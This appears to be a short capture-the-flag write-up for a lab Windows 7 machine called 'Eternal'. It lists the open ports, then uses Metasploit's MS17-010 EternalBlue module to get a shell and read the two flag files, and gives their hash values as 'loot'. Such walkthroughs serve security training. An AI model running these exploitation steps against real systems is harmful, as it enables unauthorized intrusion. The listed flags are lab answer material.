# Eternal

**IP Address:** 172.31.1.10

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 10243/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 2869/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 445/tcp | open | microsoft-ds | Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds  |
| 49152/tcp | open | msrpc | Microsoft Windows RPC  |
| 49153/tcp | open | msrpc | Microsoft Windows RPC  |
| 49154/tcp | open | msrpc | Microsoft Windows RPC  |
| 49155/tcp | open | msrpc | Microsoft Windows RPC  |
| 49161/tcp | open | msrpc | Microsoft Windows RPC  |
| 49162/tcp | open | msrpc | Microsoft Windows RPC  |
| 5357/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 554/tcp | open | rtsp |   |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 1900/udp | open | upnp |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 500/udp | open|filtered | isakmp |   |

## Exploitation
### Exploit Details (Metasploit)
* **Name** - MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
* **CVE** - 2017-0143
* **Module** - exploit/windows/smb/ms17_010_eternalblue
* **Disclosed** - 2017-03-14
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2017-0143

1. Show metasploit options

Commands
```
show options
```
![Execute Exploit](images/exploit1.png)

2. Run exploit
Commands
```bash
run
shell
whoami
type C:\Users\Lazlo\Desktop\access.txt.txt
type C:\Users\Administrator\Desktop\system.txt.txt
```
![Execute Exploit](images/exploit2.png)

## Loot
```
access.txt.txt
cb1fc8533080fcb3e2636234f5e601c3
system.txt.txt
ab04582b704dde9f2de2c36ffb91b5a5
```